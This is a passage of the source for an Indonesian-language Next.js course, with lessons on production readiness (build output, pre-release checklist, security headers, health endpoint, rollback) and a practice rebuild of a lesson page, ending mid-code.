        'Baris terakhir layak dipertimbangkan serius. Autentikasi punya banyak detail yang tidak terlihat sampai ada yang mencarinya, yaitu perbandingan waktu tetap, pembatasan percobaan masuk, rotasi token penyegar, deteksi pemakaian ulang, dan penanganan CSRF. Menulisnya sendiri untuk belajar sepenuhnya bagus, dan memakainya di produksi tanpa pengalaman keamanan adalah risiko yang tidak sepadan.',
      ),
      callout(
        'info',
        'Materi ini punya kelanjutan yang jauh lebih dalam',
        'Yang dibahas di sini hanya sisi integrasi dengan App Router. Hashing kata sandi, rotasi token, pembatasan percobaan masuk, MFA, dan OAuth semuanya dibahas di Kategori Keamanan Fullstack. Seluruh keputusan di sub-bab ini bertumpu pada lapisan itu dikerjakan dengan benar.',
      ),
      references(
        {
          label: 'Authentication',
          href: 'https://nextjs.org/docs/app/guides/authentication',
          source: 'Next.js',
          note: 'Panduan resmi sesi, cookie, dan tempat verifikasi seharusnya diletakkan.',
        },
        {
          label: 'cookies()',
          href: 'https://nextjs.org/docs/app/api-reference/functions/cookies',
          source: 'Next.js',
          note: 'Menyetel dan membaca cookie beserta atribut `httpOnly`, `secure`, dan `sameSite`.',
        },
        {
          label: 'Set-Cookie — SameSite',
          href: 'https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie',
          source: 'MDN Web Docs',
          note: 'Arti setiap atribut cookie dan pertahanan CSRF dasar yang diberikan `SameSite`.',
        },
        {
          label: 'Authentication Cheat Sheet',
          href: 'https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html',
          source: 'OWASP',
          note: 'Daftar wajib alur login: hashing adaptif, pesan gagal seragam, rate limit, rotasi sesi.',
        },
      ),
    ],
  ),

  written(
    'produksi',
    'Menyiapkan untuk Produksi',
    19,
    'Dari `next build` sampai siap dijalankan.',
    [
      p(
        'Sub-bab ini menjembatani ke kategori Deployment. Fokusnya bukan cara men-deploy, melainkan apa yang harus benar **sebelum** kata deploy disebut.',
      ),

      terms(
        {
          term: 'First Load JS',
          meaning:
            'Total JavaScript yang harus diunduh browser sebelum sebuah rute bisa dipakai. Ini angka yang paling berguna di keluaran build: **lonjakan tiba-tiba di satu rute** hampir selalu berarti satu impor yang menarik sesuatu besar tanpa disengaja.',
        },
        {
          term: 'penanda ○ ● ƒ',
          meaning:
            'Tiga tanda di keluaran `next build`. **`○`** statis (dibuat saat build), **`●`** SSG dari `generateStaticParams`, **`ƒ`** dinamis (dirender tiap permintaan). Rute yang kamu kira statis tapi bertanda `ƒ` berarti ada yang memaksanya dinamis — biasanya `cookies()` di layout.',
        },
        {
          term: 'npm run start',
          meaning:
            'Menjalankan hasil build dalam **mode produksi** secara lokal. Wajib dicoba sebelum deploy: mode development memakai konfigurasi, penanganan error, dan optimasi yang berbeda, sehingga `npm run dev` yang lancar **bukan bukti apa pun**.',
        },
        {
          term: 'curl -I',
          meaning:
            'Perintah yang meminta **hanya header** sebuah balasan HTTP, tanpa isinya. Dipakai memverifikasi header keamanan pada server yang benar-benar berjalan — bukan dengan membaca `next.config.ts` lalu berasumsi.',
        },
        {
          term: 'CSP',
          meaning:
            'Singkatan *Content-Security-Policy* — header yang membatasi dari mana skrip, gaya, dan gambar boleh dimuat. Ia tidak menggantikan pembersihan input; ia **membatasi ledakannya** kalau XSS lolos di suatu tempat.',
        },
        {
          term: 'HSTS',
          meaning:
            'Singkatan *HTTP Strict Transport Security* — header yang memberi tahu browser "situs ini selalu HTTPS, jangan pernah coba HTTP lagi". Ia menutup celah sesaat pada kunjungan pertama sebelum pengalihan ke HTTPS terjadi.',
        },
        {
          term: 'npm audit',
          meaning:
            'Perintah yang memeriksa kerentanan yang sudah diketahui pada dependency-mu. Catatan penting: jangan menjalankan `--force` tanpa membaca apa yang akan berubah — ia bisa menurunkan versi mayor dan merusak hal lain diam-diam.',
        },
        {
          term: 'rencana rollback',
          meaning:
            'Jawaban atas tiga pertanyaan yang ditentukan **sebelum** deploy: bagaimana kembali ke versi sebelumnya, apa yang **tidak bisa** dibatalkan (migrasi, email terkirim, pembayaran), dan sinyal apa yang memicu keputusan itu. Diputuskan saat tenang, bukan saat panik.',
        },
        {
          term: 'verifikasi pasca-deploy',
          meaning:
            'Deploy tidak selesai saat pipeline hijau. Yang harus diperiksa: perilaku yang diubah benar-benar bekerja **di lingkungan target**, tingkat error dan latensi dibanding sebelum deploy, dan log tidak menampilkan jenis error baru.',
        },
      ),

      h2('Membaca keluaran build'),
      code(
        'bash',
        `
        npm run build
        `,
      ),
      code(
        'text',
        `
        Route (app)                          Size  First Load JS
        ┌ ○ /                              1.2 kB         105 kB
        ├ ● /kelas/[category]/[chapter]     2.8 kB         112 kB
        └ ƒ /api/produk                       0 B            0 B

        ○  (Static)   prerendered as static content
        ●  (SSG)      prerendered using generateStaticParams
        ƒ  (Dynamic)  server-rendered on demand
        `,
      ),
      p('Tiga hal yang harus kamu periksa di keluaran itu:'),
      ol(
        '**Rute yang seharusnya statis tapi bertanda `ƒ`.** Ada yang memaksanya dinamis — biasanya `cookies()` di layout.',
        '**First Load JS yang melonjak di satu rute.** Hampir selalu satu impor yang menarik sesuatu besar.',
        '**Jumlah rute yang dihasilkan.** Kalau `generateStaticParams` salah, angkanya akan jauh dari harapan.',
      ),

      h2('Checklist pra-produksi'),
      steps(
        {
          title: 'Semua perintah kualitas hijau',
          body: 'Jalankan build, lint, type-check, format, dan test — lalu **baca outputnya**. "Seharusnya lulus" bukan verifikasi. Klaim tanpa keluaran perintah adalah tebakan.',
        },
        {
          title: 'Environment variable lengkap di target',
          body: 'Setiap variabel yang dibaca saat boot harus ada, dan ketiadaannya harus menggagalkan start dengan pesan jelas — bukan gagal misterius di permintaan pertama.',
        },
        {
          title: 'Tidak ada rahasia di bundle',
          body: 'Periksa tidak ada rahasia asli di belakang `NEXT_PUBLIC_`, tidak ada yang ter-`console.log`, dan tidak ada berkas `.env` yang ikut ter-commit.',
        },
        {
          title: 'Header keamanan terpasang',
          body: 'CSP, HSTS, `X-Content-Type-Options`, dan `Referrer-Policy`. Verifikasi dengan `curl -I` pada server yang benar-benar berjalan, jangan hanya membaca konfigurasinya.',
        },
        {
          title: 'Audit dependency bersih',
          body: 'Jalankan `npm audit`. Kalau perbaikannya memaksa penurunan versi mayor yang merusak, catat keputusannya — jangan jalankan `--force` tanpa membaca apa yang akan berubah.',
        },
        {
          title: 'Rencana rollback sudah ada',
          body: 'Tentukan **sebelum** deploy: bagaimana kembali ke versi sebelumnya, apa yang tidak bisa dibatalkan, dan sinyal apa yang memicu keputusan itu.',
        },
      ),

      h2('Menjalankan hasil build'),
      code(
        'bash',
        `
        # Bangun
        npm run build

        # Jalankan versi produksi secara lokal — WAJIB dicoba sebelum deploy.
        npm run start
        `,
      ),
      p(
        'Dua perintah ini harus dijalankan **berurutan dan bersama-sama**, sebab `npm run start` menyajikan hasil build terakhir, jadi menjalankannya tanpa build ulang hanya menampilkan versi lama. Yang kamu uji di sini bukan fiturnya melainkan **mode produksinya**, sebab kode sudah diminifikasi, penanganan error sudah menyamarkan detail internal, dan halaman statis sudah benar-benar dibuat sebagai berkas. Seperti disebut di kotak berikut, tiga kategori bug hanya bisa muncul di mode ini, yaitu hydration mismatch yang di development hanya berupa peringatan, variabel environment yang ternyata tidak terbaca saat build, dan rute yang ternyata dinamis padahal kamu mengira statis. Sepuluh menit menjalankan ini jauh lebih murah daripada menemukan ketiganya setelah deploy.',
      ),
      callout(
        'warning',
        '`npm run dev` bukan bukti apa pun',
        'Mode development memakai konfigurasi, penanganan error, dan optimasi yang berbeda. Bug yang hanya muncul di produksi adalah kategori bug tersendiri: hydration mismatch, variabel environment yang hilang, dan `dynamic` yang berperilaku lain. Selalu jalankan `npm run start` sekali sebelum deploy.',
      ),

      h2('Memeriksa header di server yang benar-benar jalan'),
      code(
        'bash',
        `
        curl -I http://localhost:3000
        `,
      ),
      p(
        'Website yang sedang kamu baca memverifikasi header keamanannya persis dengan cara ini — bukan dengan membaca `next.config.ts` lalu berasumsi. Konfigurasi yang benar tapi tidak diterapkan adalah kegagalan yang paling mudah terlewat.',
      ),

      h2('Setelah deploy'),
      ul(
        'Perilaku yang baru diubah benar-benar bekerja **di lingkungan target**, bukan hanya di lokal.',
        'Tingkat error dan latensi dibandingkan dengan sebelum deploy — bukan sekadar "kelihatannya normal".',
        'Log tidak menampilkan jenis error baru.',
        'Apa pun yang gagal atau dilewati dilaporkan apa adanya, tidak dibulatkan menjadi "selesai".',
      ),
      divider,
      h2('Studi kasus di project nyata'),
      p(
        'Aplikasi berjalan lancar di komputer pengembang dan gagal saat dinaikkan ke produksi. Halaman yang seharusnya statis ternyata dirender pada setiap permintaan sehingga biaya servernya tiga kali lipat perkiraan. Satu variabel lingkungan tidak disetel sehingga fitur pembayaran mati tanpa satu pun peringatan. Dan tidak ada seorang pun tahu ada yang salah selama enam jam, sebab tidak ada pemantauan.',
      ),
      p(
        'Ketiganya bisa ditangkap sebelum rilis. Keluaran `next build` adalah alat diagnosa yang paling sering diabaikan.',
      ),
      code(
        'text',
        `
        $ npm run build

        Route (app)                              Size     First Load JS
        ┌ ○ /                                    1.2 kB          89 kB
        ├ ○ /tentang                             0.8 kB          88 kB
        ├ ● /produk/[id]                         2.1 kB          95 kB
        └ ƒ /pesanan                             3.4 kB         142 kB

        ○  (Static)   prerendered as static content
        ●  (SSG)      prerendered as static HTML
        ƒ  (Dynamic)  server-rendered on demand

        Tiga hal yang WAJIB dibaca:
        1. Simbol tiap rute. Ada yang ƒ padahal seharusnya ○?
        2. First Load JS. Naik drastis berarti ada 'use client' terlalu tinggi
        3. Peringatan di atas tabel, yang sering tergulir hilang
        `,
        { caption: 'Tabel ini menjawab sebagian besar pertanyaan performa sebelum rilis.' },
      ),
      p(
        'Kolom First Load JS adalah angka yang paling sering diabaikan dan paling menentukan pengalaman di jaringan lambat. Kalau satu rute jauh lebih besar dari yang lain, hampir selalu ada `use client` yang terlalu tinggi sehingga menarik pustaka berat ke bundel. Membandingkannya antar-rilis menangkap penurunan sebelum pengguna merasakannya.',
      ),
      code(
        'text',
        `
        Checklist sebelum rilis, dijalankan dan outputnya DIBACA:

        npm run lint            -> tidak ada error
        npx tsc --noEmit        -> tidak ada error tipe
        npm run test            -> seluruh test hijau
        npm run build           -> berhasil, dan tabel rutenya diperiksa
        npx next start          -> jalankan versi produksi di lokal

        Lalu periksa hal yang HANYA terlihat di mode produksi:
        - Perilaku cache. Mode pengembangan tidak memakai cache yang sama
        - Pesan galat. Di produksi ia disembunyikan dan diganti digest
        - Ukuran bundel sungguhan

        Dan periksa kebocoran:
        grep -r "sk_live\\|password\\|secret" .next/static/
        `,
        { caption: 'Menjalankan `next start` di lokal menangkap sebagian besar kejutan produksi.' },
      ),
      p(
        'Langkah `next start` di lokal adalah yang paling sering dilewatkan dan paling banyak menangkap. Mode pengembangan berperilaku berbeda dalam banyak hal, terutama cache dan pesan galat. Masalah yang hanya muncul di produksi hampir selalu bisa direproduksi dengan menjalankan versi produksinya di komputer sendiri, dan itu jauh lebih murah daripada menemukannya setelah rilis.',
      ),
      code(
        'ts',
        `
        // Endpoint kesehatan, dipanggil alat pemantauan.
        export const dynamic = 'force-dynamic';   // jangan pernah di-cache

        export async function GET() {
          try {
            await db.$queryRaw\`SELECT 1\`;        // periksa database benar-benar hidup
            return Response.json({ status: 'sehat' });
          } catch {
            return Response.json({ status: 'sakit' }, { status: 503 });
          }
        }
        `,
        { filename: 'app/api/sehat/route.ts' },
      ),
      p(
        'Endpoint kesehatan yang hanya mengembalikan status tanpa memeriksa apa pun memberi rasa aman yang keliru. Yang berguna adalah yang benar-benar menyentuh ketergantungan utamanya, misalnya satu kueri ringan ke database. Penanda `force-dynamic` diperlukan supaya ia tidak di-cache, sebab endpoint kesehatan yang di-cache selalu mengembalikan status lama.',
      ),
      callout(
        'danger',
        'AI tidak pernah men-deploy atas inisiatifnya sendiri',
        'Aturan `deployment.md` project ini mengikat, yaitu rilis, push, dan menjalankan migrasi ke produksi hanya dilakukan saat user memintanya secara eksplisit. Checklist di atas boleh dijalankan kapan saja sebab ia hanya memeriksa, dan langkah rilisnya sendiri menunggu keputusan user.',
      ),

      h2('Saat error-nya muncul'),
      p(
        'Empat kegagalan berikut adalah yang paling sering muncul justru setelah rilis, saat perbaikannya paling mahal.',
      ),
      code(
        'text',
        `
        # Keluaran build:
        └ ƒ /produk          # ƒ = dirender saat diminta

        # Padahal katalog produk seharusnya statis.
        # Biaya server tiga kali lipat perkiraan.
        `,
        { caption: 'Rute menjadi dinamis tanpa disadari.' },
      ),
      p(
        'Tidak ada error, dan biayanya baru terlihat di tagihan. Penyebabnya hampir selalu satu pemanggilan yang membuat halaman bergantung pada permintaan, misalnya `cookies()` di dalam fungsi bantu. Membaca tabel rute pada setiap build menangkapnya sebelum rilis, dan itu memakan lima detik.',
      ),
      code(
        'text',
        `
        # Di pengembangan, halaman selalu menampilkan data terbaru.
        # Di produksi, data tidak berubah selama berjam-jam.

        # Mode pengembangan tidak memakai cache yang sama.
        `,
        { caption: 'Perilaku cache diuji di mode yang salah.' },
      ),
      p(
        'Ini kejutan produksi yang paling sering, dan pencegahannya satu langkah. Setelah `next build`, jalankan `next start` lalu uji perilaku cache di sana. Hanya di mode itu perilakunya sama dengan produksi. Menguji cache di mode pengembangan tidak pernah memberi jawaban yang benar.',
      ),
      code(
        'text',
        `
        # KUNCI_PEMBAYARAN tidak disetel di produksi.
        # Aplikasi menyala normal.
        # Pengguna pertama yang membayar:

        TypeError: Cannot read properties of undefined (reading 'charge')
        `,
        { caption: 'Konfigurasi yang hilang baru ketahuan saat dipakai.' },
      ),
      p(
        'Aplikasi yang menyala dengan konfigurasi tidak lengkap gagal di tempat yang salah dan pada waktu yang paling merugikan. Memvalidasi seluruh variabel saat boot, seperti dibahas di sub-bab sebelumnya, mengubahnya menjadi kegagalan saat menyala dengan pesan yang menyebut variabel mana yang kurang.',
      ),
      code(
        'text',
        `
        # Layanan mati selama enam jam.
        # Tidak ada yang tahu sampai ada pengguna menghubungi lewat media sosial.

        # Tidak ada endpoint kesehatan dan tidak ada pemantauan.
        `,
        { caption: 'Tidak ada satu pun tanda, dan itulah masalahnya.' },
      ),
      p(
        'Kegagalan yang tidak terdeteksi berlangsung selama waktu yang dibutuhkan seseorang untuk mengeluh. Endpoint kesehatan yang dipanggil berkala oleh alat pemantauan mengubah enam jam menjadi beberapa menit. Ini bukan kemewahan, dan biayanya beberapa baris ditambah satu layanan pemantauan yang sebagian besarnya punya paket gratis.',
      ),
      table(
        ['Gejala', 'Penyebab sebenarnya', 'Perbaikannya'],
        [
          [
            'Biaya server jauh di atas perkiraan',
            'Rute menjadi dinamis tanpa disadari',
            'Baca tabel rute pada setiap build',
          ],
          [
            'Perilaku berbeda antara pengembangan dan produksi',
            'Cache diuji di mode pengembangan',
            'Uji dengan `next build` lalu `next start`',
          ],
          [
            'Fitur mati tanpa peringatan setelah rilis',
            'Variabel lingkungan tidak divalidasi saat boot',
            'Validasi seluruhnya dengan skema, dan lempar saat menyala',
          ],
          [
            'Gangguan berlangsung berjam-jam tanpa terdeteksi',
            'Tidak ada endpoint kesehatan dan pemantauan',
            'Sediakan endpoint yang menyentuh ketergantungan utamanya',
          ],
          [
            'Bundel membengkak antar-rilis',
            'Tidak ada yang membandingkan First Load JS',
            'Catat angkanya, dan bandingkan pada tiap rilis',
          ],
        ],
      ),

      h2('Kesalahan umum pemula'),
      p(
        'Kesiapan produksi jarang gagal karena hal yang rumit, dan hampir selalu karena langkah pemeriksaan yang dilewati.',
      ),
      table(
        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
        [
          [
            'Tidak membaca keluaran `next build`',
            'Yang penting berhasil',
            'Tabel rutenya menjawab sebagian besar pertanyaan performa dan biaya sebelum rilis',
          ],
          [
            'Menguji hanya di mode pengembangan',
            'Aplikasinya sama',
            'Cache dan pesan galat berperilaku berbeda. Jalankan `next start` di lokal',
          ],
          [
            'Tidak memvalidasi variabel lingkungan',
            'Sudah disetel di panel hosting',
            'Satu yang terlewat membuat fitur mati tanpa peringatan. Validasi saat boot',
          ],
          [
            'Tidak menyediakan endpoint kesehatan',
            'Kalau mati pasti ketahuan',
            'Ketahuan setelah ada yang mengeluh, dan itu bisa berjam-jam',
          ],
          [
            'Merilis tanpa rencana pengembalian',
            'Kalau rusak tinggal perbaiki',
            'Memperbaiki di bawah tekanan jauh lebih lambat daripada mengembalikan ke versi sebelumnya. Putuskan caranya sebelum rilis',
          ],
          [
            'Menjalankan migrasi database bersamaan dengan rilis kode',
            'Sekalian',
            'Kalau kodenya dikembalikan, migrasinya tidak ikut. Pakai pola tambah dulu lalu hapus belakangan',
          ],
        ],
      ),
      p(
        'Baris terakhir sering baru dipahami setelah ada rilis yang harus dikembalikan. Migrasi yang menghapus kolom bersamaan dengan kode yang berhenti memakainya membuat pengembalian kode menjadi tidak aman, sebab kode lama masih membutuhkan kolom itu. Pola yang aman adalah menambah dulu, memindahkan datanya, mengalihkan kodenya, lalu menghapus yang lama di rilis berikutnya.',
      ),
      callout(
        'info',
        'Checklist ini bisa dijalankan kapan saja, dan rilisnya tidak',
        'Seluruh perintah pemeriksaan di sub-bab ini hanya membaca dan tidak mengubah apa pun di luar mesinmu. Jalankan sesering mungkin. Langkah rilisnya sendiri, termasuk `git push`, membuat tag, dan menjalankan migrasi produksi, adalah keputusan user dan tidak pernah dilakukan atas inisiatif sendiri.',
      ),
      references(
        {
          label: 'Production Checklist',
          href: 'https://nextjs.org/docs/app/guides/production-checklist',
          source: 'Next.js',
          note: 'Daftar resmi yang harus benar sebelum kata deploy disebut.',
        },
        {
          label: 'next build & next start',
          href: 'https://nextjs.org/docs/app/api-reference/cli/next',
          source: 'Next.js',
          note: 'Cara membaca keluaran build beserta arti penanda `○`, `●`, dan `ƒ`.',
        },
        {
          label: 'Strict-Transport-Security',
          href: 'https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Strict-Transport-Security',
          source: 'MDN Web Docs',
          note: 'Header yang menutup celah kunjungan pertama sebelum pengalihan ke HTTPS.',
        },
        {
          label: 'npm audit',
          href: 'https://docs.npmjs.com/cli/v11/commands/npm-audit',
          source: 'npm',
          note: 'Termasuk peringatan tentang `--force` yang bisa menurunkan versi mayor diam-diam.',
        },
      ),
    ],
  ),

  written(
    'praktik-bangun-ulang',
    'Praktik: Bangun ulang satu halaman website ini',
    28,
    'Menerapkan seluruh bab pada kode yang sedang kamu baca.',
    [
      p(
        'Praktik penutup Frontend Intermediate. Kamu akan membangun ulang halaman pelajaran, yaitu halaman yang sedang kamu baca sekarang, dari nol dengan memakai setiap konsep di bab ini. Sumber acuannya ada di depanmu, yaitu kodenya sendiri.',
      ),

      terms(
        {
          term: 'spesifikasi',
          meaning:
            'Daftar syarat yang harus dipenuhi hasil kerjamu, ditulis **sebelum** kodenya. Nilainya: ia mengubah "sudah jadi?" dari pendapat menjadi pemeriksaan. Setiap butir di daftar bawah bisa dijawab ya atau tidak, tanpa perdebatan.',
        },
        {
          term: 'proyeksi ramping',
          meaning:
            'Versi ringkas sebuah data yang dibangun di Server Component lalu dioper sebagai prop — untuk sidebar, cukup slug, judul, dan nomor. Karena bundler **tidak bisa** membuang properti objek yang tidak dipakai, kamu yang harus memilihnya lebih dulu.',
        },
        {
          term: 'batas klien di daun',
          meaning:
            'Menaruh `"use client"` hanya di komponen paling ujung yang benar-benar interaktif — penanda selesai, tombol salin kode, tombol drawer. Isi pelajarannya tetap Server Component, sehingga prosanya tidak pernah ikut ke bundle browser.',
        },
        {
          term: 'snapshot server kosong',
          meaning:
            'Argumen ketiga `useSyncExternalStore`. Di server tidak ada `localStorage`, jadi ia harus mengembalikan empty state — dan komponennya wajib menampilkan skeleton sampai `hydrated` bernilai true. Tanpa itu, React melaporkan hydration mismatch.',
        },
        {
          term: 'kriteria selesai',
          meaning:
            'Definisi "sudah beres" yang berbasis **keluaran perintah yang benar-benar dibaca**, bukan "kelihatannya jalan". Lima perintah di bawah adalah bentuk konkretnya: build, lint, type-check, test, lalu jalankan dan benar-benar klik sekitarnya.',
        },
        {
          term: 'kebocoran bundle',
          meaning:
            'Kode yang ikut ke browser padahal tidak dibutuhkan di sana. Yang membuatnya berbahaya: **tidak ada gejala apa pun** — tidak ada error, tidak ada peringatan, halaman tetap normal. Ia hanya makin mahal, dan tumbuh setiap kali materi baru ditulis.',
        },
        {
          term: 'aturan yang dijaga mesin',
          meaning:
            'Prinsip penutup seluruh kategori ini: aturan yang dijaga tes bertahan, aturan yang dijaga ingatan tidak. Tes impor di website ini menemukan **dua pelanggar** yang terlewat oleh pemeriksaan manual.',
        },
        {
          term: 'verifikasi, bukan asumsi',
          meaning:
            'Membuktikan sesuatu dengan menjalankan perintahnya dan membaca hasilnya. "Seharusnya lulus" dan "kemarin lulus" bukan verifikasi. Ini berlaku sama untuk build, untuk header keamanan, dan untuk klaim bahwa sebuah halaman benar-benar statis.',
        },
      ),

      h2('Spesifikasinya'),
      ul(
        'URL: `/kelas/[category]/[chapter]/[lesson]`',
        'Seluruh halaman dibuat saat build (SSG), tidak ada render per permintaan.',
        'Sidebar navigasi tidak di-render ulang saat pindah antar pelajaran.',
        'Progres belajar dari `localStorage`, tanpa ketidakcocokan hidrasi.',
        'Slug yang tidak ada menghasilkan 404 yang ramah.',
        'Bundle browser **tidak** boleh memuat isi pelajaran mana pun selain yang sedang dibuka.',
      ),

      h2('Langkah kerja'),
      steps(
        {
          title: '1. Susun rutenya',
          body: 'Buat `app/kelas/[category]/[chapter]/[lesson]/page.tsx`. Ingat `params` adalah Promise dan harus di-`await` — ini yang paling sering salah kalau kamu meniru tutorial lama.',
        },
        {
          title: '2. Hasilkan seluruh halaman saat build',
          body: 'Tulis `generateStaticParams` yang mengembalikan setiap kombinasi kategori/bab/pelajaran. Verifikasi dengan `npm run build`: jumlah rute yang muncul harus sama dengan jumlah sub-babmu.',
        },
        {
          title: '3. Tambahkan metadata dinamis',
          body: '`generateMetadata` dengan judul dan deskripsi per pelajaran. Uji dengan membuka halamannya dan memeriksa judul tab serta `<meta>` di sumber halaman.',
        },
        {
          title: '4. Pasang layout dengan sidebar',
          body: 'Buat `app/kelas/layout.tsx`. Bangun proyeksi navigasi di Server Component berisi slug, judul, dan nomor saja, lalu oper sebagai prop. **Jangan** biarkan komponen sidebar mengimpor kurikulum.',
        },
        {
          title: '5. Tandai batas klien di daun',
          body: 'Hanya bagian yang benar-benar interaktif yang mendapat `"use client"`: penanda selesai, tombol salin kode, dan tombol drawer di layar kecil. Isi pelajarannya tetap Server Component.',
        },
        {
          title: '6. Tangani progres dari localStorage',
          body: 'Pakai `useSyncExternalStore` dengan snapshot server yang kosong, dan tampilkan skeleton sampai terhidrasi. Tanpa ini, React akan melaporkan hydration mismatch.',
        },
        {
          title: '7. Lengkapi keadaan gagal',
          body: 'Tambahkan `not-found.tsx` dan panggil `notFound()` untuk slug yang tidak dikenal. Tambahkan `error.tsx` yang menampilkan `digest`, bukan `error.message`.',
        },
        {
          title: '8. Verifikasi, jangan berasumsi',
          body: 'Jalankan build dan baca keluarannya: semua rute pelajaran harus bertanda `●` (SSG), dan First Load JS tidak boleh membengkak seiring jumlah materi bertambah.',
        },
      ),

      h2('Cara membuktikan bundle-nya bersih'),
      code(
        'ts',
        `
        // Tes yang dipakai website ini. Ia menemukan dua pelanggar
        // yang terlewat oleh pemeriksaan manual.
        const TERLARANG_DI_KLIEN = [
          "from '@/content/curriculum",
          "from '@/lib/curriculum/queries'",
        ];

        it('tidak ada Client Component yang mengimpor kurikulum', () => {
          const pelanggar = berkasKlien.filter((f) =>
            TERLARANG_DI_KLIEN.some((t) => imporRuntime(f).includes(t)),
          );

          expect(pelanggar).toEqual([]);
        });
        `,
      ),
      p(
        'Komentar di baris kedua adalah bagian yang paling layak diperhatikan, sebab tes ini **menemukan dua pelanggar yang lolos dari pemeriksaan manual.** Itu bukan kebetulan, karena impor terlarang tidak menghasilkan gejala apa pun, jadi tidak ada yang memicu seseorang untuk memeriksanya. Perhatikan fungsi yang dipakai bernama `imporRuntime` dan bukan sekadar membaca seluruh teks berkas. Bentuk `import type` dihapus saat kompilasi dan tidak menambah apa pun ke bundle, jadi menandainya sebagai pelanggaran hanya akan menghasilkan gagal palsu. Dan `expect(pelanggar).toEqual([])` sengaja membandingkan dengan array kosong alih-alih memeriksa panjangnya, supaya pesan gagalnya langsung **menyebutkan berkas mana** yang bermasalah.',
      ),
      callout(
        'tip',
        'Kenapa ini harus jadi tes',
        'Kebocoran bundle tidak menampakkan gejala apa pun: tidak ada error, tidak ada peringatan, halaman tetap berfungsi normal. Ia hanya makin mahal untuk pembaca, dan tumbuh setiap kali materi baru ditulis. Aturan yang dijaga mesin bertahan; aturan yang dijaga ingatan tidak.',
      ),

      h2('Kriteria selesai'),
      p('Bukan "kelihatannya jalan" — tapi keluaran perintah yang benar-benar kamu baca:'),
      code(
        'bash',
        `
        npm run build       # semua rute pelajaran bertanda ● (SSG)
        npm run lint        # 0
        npm run type-check  # 0
        npm run test        # semua lulus
        npm run start       # jalankan, lalu buka dan klik sekitarnya
        `,
      ),

      divider,

      checklist(
        'fi8-praktik',
        'Checklist praktik bab ini',
        'Rute dinamis bekerja dengan `params` yang di-`await`',
        '`generateStaticParams` menghasilkan seluruh halaman saat build',
        'Keluaran build menunjukkan rute pelajaran bertanda ● (SSG), bukan ƒ',
        '`generateMetadata` mengisi judul dan deskripsi per pelajaran',
        'Sidebar menerima proyeksi ramping sebagai prop, tidak mengimpor kurikulum',
        '`"use client"` hanya ada di komponen daun yang benar-benar interaktif',
        'Progres dari `localStorage` tidak menimbulkan ketidakcocokan hidrasi',
        '`not-found.tsx` dan `error.tsx` terpasang dan sudah diuji',
        '`error.tsx` menampilkan `digest`, bukan `error.message`',
        'Tidak ada rahasia di belakang `NEXT_PUBLIC_`',
        'Header keamanan diverifikasi dengan `curl -I`, bukan dengan membaca konfigurasi',
        '`npm run start` dijalankan dan halamannya benar-benar dibuka',
      ),

      divider,
      h2('Studi kasus di project nyata'),
      p(
        'Halaman katalog produk dibangun ulang dari nol dengan seluruh materi bab ini. Yang membuatnya layak ditulis lengkap bukan jumlah fiturnya melainkan bahwa **setiap keputusan punya alasan yang bisa disebutkan**, yaitu kenapa bagian ini Server Component, kenapa filter di alamat halaman, dan kenapa bagian itu dibungkus Suspense sendiri.',
      ),
      code(
        'tsx',
        `
        // Server Component. Tidak ada 'use client' di sini,
        // sehingga pustaka pemformat dan kueri database tidak ikut ke peramban.
        import { Suspense } from 'react';

        export const revalidate = 3600;      // katalog disegarkan tiap jam

        export async function generateMetadata({
          searchParams,
        }: {
          searchParams: Promise<{ q?: string }>;
        }): Promise<Metadata> {
          const { q } = await searchParams;
          return {
            title: q ? \`Pencarian "\${q}"\` : 'Katalog Produk',
            description: 'Belanja kaos dan kemeja berkualitas.',
          };
        }

        export default async function HalamanKatalog({
          searchParams,
        }: {
          searchParams: Promise<{ q?: string; kategori?: string; halaman?: string }>;
        }) {
          const params = await searchParams;

          // Divalidasi. Alamat halaman adalah masukan dari luar.
          const filter = {
            cari: (params.q ?? '').trim().slice(0, 100),
            kategori: bacaKategori(params.kategori),
            halaman: Math.max(1, Number(params.halaman ?? '1') || 1),
          };

          return (
            <main>
              {/* Client Component KECIL, hanya untuk bagian interaktifnya. */}
              <PanelFilter nilaiAwal={filter} />

              {/* key memaksa Suspense tampil lagi saat filter berubah. */}
              <Suspense key={JSON.stringify(filter)} fallback={<SkeletonGrid jumlah={12} />}>
                <HasilProduk filter={filter} />
              </Suspense>

              {/* Rekomendasi boleh gagal tanpa menjatuhkan halaman. */}
              <BatasGalat fallback={<p>Rekomendasi sedang tidak tersedia</p>}>
                <Suspense fallback={<SkeletonBaris />}>
                  <Rekomendasi />
                </Suspense>
              </BatasGalat>
            </main>
          );
        }

        // Pengambilan data DI DALAM komponen yang dibungkus Suspense.
        async function HasilProduk({ filter }: { filter: Filter }) {
          const { item, total } = await cariProduk(filter);

          if (item.length === 0) {
            return <Kosong adaFilter={filter.cari !== '' || filter.kategori !== null} />;
          }

          return (
            <>
              <Grid produk={item} />
              <Paginasi halaman={filter.halaman} total={total} />
            </>
          );
        }
        `,
        { filename: 'app/produk/page.tsx' },
      ),
      p(
        'Prop `key` pada Suspense adalah detail kecil yang sering dilewatkan dan berpengaruh besar. Tanpa itu, mengganti filter membuat React memakai kembali batas Suspense yang sudah selesai, sehingga daftar lama tetap tampil sampai hasil baru tiba tanpa satu pun tanda. Dengan `key` yang berubah mengikuti filter, batasnya dianggap baru dan fallbacknya tampil lagi.',
      ),
      p(
        'Pengambilan data sengaja berada **di dalam** `HasilProduk`, bukan di komponen halaman. Ini aturan dari sub-bab streaming yang paling sering dilanggar. Kalau `await cariProduk` ditulis di komponen halaman lalu hasilnya dikirim sebagai props, batas Suspensenya tidak pernah aktif dan seluruh halaman menunggu.',
      ),
      p(
        'Validasi `searchParams` mengikuti aturan dari sub-bab batas server dan klien, yaitu alamat halaman adalah masukan yang tidak dipercaya. Pemotongan `slice(0, 100)` pada kata pencarian mencegah kueri yang sangat panjang, dan `bacaKategori` mencocokkan nilainya terhadap daftar yang sah. Keduanya murah dan menutup kelas masalah yang tidak berbunyi.',
      ),
      code(
        'tsx',
        `
        'use client';      // HANYA berkas ini, bukan halamannya.

        export function PanelFilter({ nilaiAwal }: { nilaiAwal: Filter }) {
          const params = useSearchParams();
          const router = useRouter();
          const jalur = usePathname();

          // Ketikan pakai state lokal supaya terasa seketika.
          const [ketikan, setKetikan] = useState(nilaiAwal.cari);

          // Alamat diperbarui setelah pengguna berhenti mengetik.
          useEffect(() => {
